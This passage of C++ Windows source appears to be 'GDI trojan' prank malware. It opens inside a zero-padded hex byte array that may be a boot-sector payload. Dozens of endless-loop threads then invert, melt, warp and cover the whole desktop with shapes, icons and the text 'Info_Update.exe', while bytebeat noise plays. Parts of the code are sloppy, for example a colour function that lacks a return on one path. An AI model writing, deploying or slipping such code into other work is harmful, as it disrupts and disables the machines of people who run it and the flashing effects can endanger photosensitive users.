7E\x57\x05\xD7\x4D\x82\xA5\xA5\xA5\x05\x32\x08\x80\x13\x07\x01\x4A\x8A\x13\x13\x96\x96\x96\x48\x48\x48\x9E\x9E\xA9\x07\xAF\x16\x91\x58\x58\x4A\x4A\x4A\x55\x55\x55\xC2\xC2\x54\x54\x54\x28\x28\xCD\xCD\xCD\x40\x58\x7F\x5E\x41\x40\x40\x01\x41\x40\x40\x01\x40\x62\xC3\x57\x2C\x2C\x00\x84\x4A\x4A\x7F\x7F\x7F\x04\xDB\x27\x83\x08\x1C\x1C\x1C\x04\x78\x6B\x8F\x0C\x0C\x0C\x85\x85\x85\x0C\x0C\xD6\xD6\xD6\x2F\x2F\x2F\x9B\x9B\x05\x4B\x5B\x06\x53\x5B\x91\x1E\x1E\x1E\x1E\x1E\x1E\x1E\xB4\xB4\xB4\x1E\x1E\x51\x51\x51\x8C\x8C\x8C\x04\x94\x6B\x06\x6F\x00\x91\x0E\x0E\x6E\x6E\x6E\x2C\x2C\x2C\x54\x54\xC2\xC2\xC2\x72\x72\x82\x82\x82\x34\x91\x64\x41\x40\x40\x01\x41\xC3\x80\x02\x31\x44\x22\x85\xBD\xBD\xBD\x0B\x0B\x36\x05\x33\x34\x05\xFC\x21\x04\xC7\x58\x81\x0B\x0B\x04\x04\x00\x05\x49\x72\x82\x7F\x7F\x7F\x05\xD2\x71\x80\x05\x04\xF2\x58\x05\xD8\x58\x8C\xA3\xA3\xA3\xA3\xA3\x13\x13\x13\x35\x35\x35\x4B\x4B\x08\x40\x01\x04\x4A\x78\x88\x7A\x29\x29\x29\x3D\x3D\x2F\x2F\x2F\x40\x7E\x5F\x7E\x41\x40\x40\x01\x40\x72\xB4\x5B\x81\x52\x52\x05\xA9\x57\x82\x0A\x0A\x0A\x08\x9A\x57\x05\x0F\x37\x85\x2B\x2B\x2B\x2B\x2B\x03\x04\xB1\x5D\x06\x1D\x00\x82\x17\x17\x0A\x04\x4B\x01\x05\x29\x5E\x05\x45\x5B\x82\x35\x27\x27\x08\x80\x07\x05\x0D\x04\x82\x5C\x5C\x5C\x04\x92\x51\x40\x94\x17\x64\x41\x40\x40\x01\x41\x9A\x80\x02\x05\x05\x05\x89\x32\x32\x32\x4B\x4B\x4B\x1F\x1F\x1F\x1F\x04\x04\x00\x85\x1F\x1F\x4B\x4B\x4B\x4B\x04\x04\x00\x84\x1F\x1F\x32\x32\x32\x08\x12\x00\x85\x31\x31\xD1\xD1\xD1\xD1\x04\x04\x00\x84\x1F\x1F\x1B\x1B\x1B\x40\x91\x7B\x66\x41\x40\x40\x01\x41\x07\xCE\x01\x41\x95\x95\x01\x43\x2A\x2A\x03\x46\x54\x54\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
HCRYPTPROV prov;
POINT point;
POINT position;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

POINT mkp(int x, int y) {
    POINT p;
    p.x = x;
    p.y = y;
    return p;
}

VOID WINAPI CircleInvert(int x, int y, int w, int h) {
    HWND hwnd = NULL;
    HDC hdc = GetDC(hwnd);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
    BitBlt(hdc, x, y, w, h, hdc, x, y, 0x2837E28);
    SelectClipRgn(hdc, hrgn);
    DeleteObject(hrgn);
    ReleaseDC(hwnd, hdc);
}

int random() {
    if (prov == NULL)
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);

    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}

DWORD WINAPI Fault(LPVOID lpParam) {
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1)
    {
        SelectObject(DC, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(DC, 0, 0, w, h, PATINVERT);
        BitBlt(DC, -2, -2, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI FanseYuanquan(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    int i = 0;
    int n = 50;
    int x = random() % (w - 100);
    int y = random() % (h - 100);
    for (;;) {
        if (n >= 450) {
            x = random() % (w - 400);
            y = random() % (h - 400);
            n = 50;
            i = 0;

        }
        HDC hcdc = CreateCompatibleDC(hdc);
        BitBlt(hcdc, 100, 100, w, h, hdc, 0, 0, SRCCOPY);
        PatBlt(hdc, 100, 100, w, h + 1000, PATINVERT);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        HBRUSH hBrush = CreatePatternBrush(hBitmap);
        PatBlt(hdc, 100, 100, w - 1000, h + 100, PATINVERT);
        SelectObject(hdc, hBrush);
        for (; i <= n; i += 10) {
            Ellipse(hdc, x - i, y - i, x + i, y + i);
            Sleep(20);
        }
        DeleteObject(hBrush);
        DeleteObject(hBitmap);
        n += 50;
    }
    return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 5) + 20 | t >> 13)) >> (t >> 14);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI rgb(LPVOID lpParam) {
    HWND v3;
    HBITMAP h;
    HDC hdcSrc;
    HDC hdc;
    void* lpvBits;
    int nHeight;
    int nWidth;
    DWORD v12;
    int j;
    int v14;
    int i;
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}

DWORD WINAPI DrawError4(LPVOID lpParam) {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    while (true)
    {
        DrawIconEx(hdc, random() % GetSystemMetrics(0), random() % GetSystemMetrics(1), LoadIcon(NULL, MAKEINTRESOURCE(32512 + random() % 7)), random() % GetSystemMetrics(0), random() % GetSystemMetrics(1), NULL, NULL, DI_NORMAL);
        Sleep(100);
    }
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << 1 ^ (t << 1) + (t >> 7) & t >> 6 | t >> 4 - (1 ^ 7 & t >> 8) | t >> 7);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI Lines(LPVOID lpParam) {
    HDC hdc = GetDC(HWND_DESKTOP);
    int ScreenWidth, ScreenHeight;
    ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    ScreenHeight = GetSystemMetrics(SM_CYSCREEN);
    for (;;)
    {
        HDC hdc = GetDC(HWND_DESKTOP);
        LineTo(hdc, rand() % (0 - ScreenWidth), 0);
        LineTo(hdc, rand() % (0 - ScreenWidth), ScreenHeight);
    }
}

DWORD WINAPI invmelter(LPVOID lpParam) {
    HDC dc;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
    for (;;) {
        dc = GetDC(0);
        x = rand() % w;
        BitBlt(dc, x, 1, 10, h, dc, x, 0, NOTSRCCOPY);
    }
}

DWORD WINAPI drawshell32icon(LPVOID lpParam) {
    int w{ GetSystemMetrics(SM_CXSCREEN) };
    int h{ GetSystemMetrics(SM_CYSCREEN) };
    HWND hwnd = GetDesktopWindow();
    HINSTANCE Shell32 = LoadLibrary(_T("Shell32.dll"));
    HDC hdc = GetWindowDC(hwnd);
    srand(time(0));
    Sleep(1000);
    while (1) {
        for (int x = 0; x <= w; x += 32) {
            for (int y = 0; y <= h; y += 32) {
                DrawIcon(hdc, x, y, LoadIcon(Shell32, MAKEINTRESOURCE(rand() % 256)));
            }
        }
        Sleep(2000);
    }
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t + 25) ^ t >> 96 * (t - 9) + t >> 5);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}


DWORD WINAPI ColorInvert(LPVOID lpParam) {
    for (;;) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        ReleaseDC(0, hdc);
        DeleteObject(hdc);

        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Color(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1)
    {
        desk = GetDC(0);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI balls(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        x += incrementor * signX;
        y += incrementor * signY;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI dinnerbone(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    for (;;) {
        desk = GetDC(0);
        StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY);
        Sleep(1000);
    }
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 2048 ? 6 : 16) + (1 & t >> 14)) >> (3 & t >> 8) | t >> (t & 2048 ? 3 : 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI shader4(LPVOID lpParam) {
    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sh, t = y ^ y | x;
            rgbtriple[i].rgbtRed += GetRValue(y);
            rgbtriple[i].rgbtGreen += GetGValue(i);
            rgbtriple[i].rgbtBlue += GetBValue(t);
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
    }
}

DWORD WINAPI CopyCur(LPVOID lpParam) {
    int w{ GetSystemMetrics(SM_CXSCREEN) };
    int h{ GetSystemMetrics(SM_CYSCREEN) };
    HDC hdc = GetDC(0);
    POINT pt;
    while (true)
    {
        for (int x = 0; x <= w; x += 32) {
            for (int y = 0; y <= h; y += 32) {
                GetCursorPos(&pt);
                DrawIcon(hdc, x, y, LoadCursor(0, MAKEINTRESOURCE(rand() % 256)));;
            }
        }
        Sleep(1000);

    }
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(1 * (t >> 5 & t) - (t >> 5) + t * (t >> 15 & 13));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI textout(LPVOID lpParam) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Info_Update.exe";
    while (1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
    }
}

DWORD WINAPI triangle(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, 50, 50);
    SelectObject(hcdc, hBitmap);
    for (int i = 0; i <= 50; i++) {
        for (int j = 0; j < 50; j++) {
            SetPixel(hcdc, i, j, RGB(random() % 256, random() % 256, random() % 256));
        }
    }
    HBRUSH hBrush = CreatePatternBrush(hBitmap);
    SelectObject(hdc, hBrush);
    int numx = w / 150;
    if (w % 150 != 0) {
        numx++;
    }
    int numy = h / 150;
    if (h % 150 != 0) {
        numy++;
    }
    WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
    HWAVEOUT hwo;
    const int bufsize = 44100 * 10;
    char* wavedata = (char*)LocalAlloc(0, bufsize);
    WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
    for (int i = 0; i <= 10; i++) {
        for (int i = 0; i < bufsize; i++) {
            wavedata[i] = (unsigned char)((i % 257) / 2 + 100);
        }
        for (int i = 0; i <= numx; i++) {
            for (int j = 0; j <= numy; j++) {
                POINT pt[] = { mkp(150 * i, 150 * j), mkp(150 * i + 150, 150 * j), mkp(150 * i, 150 * j + 150) };
                Polygon(hdc, pt, 3);
            }
        }

    }
    return 0;
}

DWORD WINAPI shader5(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += (x ^ y);
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        //Sleep(100);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t | t % 255 | t % 257) + (t & t >> 8) + (t * (42 & t >> 10)) + ((t % ((t >> 8 | t >> 16) + 1)) ^ t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI  payload2(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    int cx, cy, sgn;
    sgn = 0;
    int dwStartTime = time(NULL);
    for (int t = 0; time(NULL) < (dwStartTime + 30000); t++) {
        HDC hdc = GetDC(NULL);
        for (cy = 0; cy < h; ) {
            for (cx = 0; cx < w; ) {
                DrawIcon(hdc, cx, cy, LoadIcon(NULL, MAKEINTRESOURCE(32512 + sgn)));
                cx += 20;
                Sleep(0.5);
            }
            cy += 20;
            if (sgn >= 6) {
                sgn = 0;
            }
            else {
                sgn++;
            }
        }
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
    }
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    return 0;
}

DWORD WINAPI rainbowblock(LPVOID lpParam) {
    int dwStartTime = time(NULL);
    for (int t = 0; time(NULL) < (dwStartTime + 30000); t++) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
        PatBlt(hcdc, 0, (t % 40) * (h / 40), w, h / 40, PATINVERT);
        SelectObject(hcdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
        PatBlt(hcdc, (t % 40) * (w / 40), 0, w / 40, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(0.5);
    }
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    return 0;
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> (t >> 13 & t)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI pacmans(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI beziers(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh };
        HPEN hPen = CreatePen(PS_SOLID, 5, Hue(239));
        SelectObject(hdc, hPen);
        PolyBezier(hdc, p, 4);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
        Sleep(4);
    }
}

DWORD WINAPI sinewaves(LPVOID lpParam) {
    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        desk = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 20;
            BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
            angle += 3.14159265358979323846264338327950288 / 40;
            DeleteObject(&i); DeleteObject(&a);
        }
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
    }
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t >> 12 & t >> 8) >> (t >> 20 & t >> 12)) * t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI sh(LPVOID lpParam) {
    HDC hdc = GetDC(HWND_DESKTOP);
    int X = GetSystemMetrics(SM_CXSCREEN);
    int Y = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        HDC hdc = GetDC(HWND_DESKTOP);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        BitBlt(hdc, rand() % 10, rand() % 10, sw, sh, hdc, rand() % 10, rand() % 10, SRCINVERT);
        ReleaseDC(0, hdc);
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        Sleep(250);
    }
}

DWORD WINAPI invmelter2(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    for (;;)
    {
        desk = GetDC(0);
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        PatBlt(desk, 0, 0, x, y, PATINVERT);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        hdc = GetDC(0);
